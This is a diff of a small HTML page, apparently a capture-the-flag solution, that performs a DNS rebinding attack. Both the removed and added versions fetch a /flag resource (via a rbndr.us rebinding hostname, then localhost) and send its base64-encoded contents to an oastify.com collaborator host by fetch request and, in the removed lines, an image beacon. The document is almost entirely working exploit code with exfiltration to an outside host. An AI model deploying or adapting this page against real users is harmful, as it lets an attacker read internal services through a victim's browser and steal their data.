@@ -1,16 +1,29 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>DNS Rebinding Simulation</title>
+</head>
+<body>
 <script>
 setTimeout(() => {
-    fetch('http://7f000001.acd918ee.rbndr.us/flag')
+    fetch('http://localhost/flag')
         .then(r => r.text())
         .then(flag => {
-            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag));
-            new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?img=' + btoa(flag);
+            // Submit flag to the specified endpoint
+            fetch('http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
+                .then(() => {
+                    document.body.innerHTML = '<h1>Flag submitted successfully!</h1>';
+                    console.log('Flag submitted:', flag);
+                })
+                .catch(err => {
+                    document.body.innerHTML = '<h1>Error submitting flag:</h1><p>' + err.message + '</p>';
+                });
         })
         .catch(err => {
-            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + err.message);
+            document.body.innerHTML = '<h1>Error fetching flag:</h1><p>' + err.message + '</p>';
+            console.error('Error fetching flag:', err);
         });
 }, 2000);
 </script>
-<h1>DNS Rebinding Attack Loading...</h1>
+</body>
 </html>
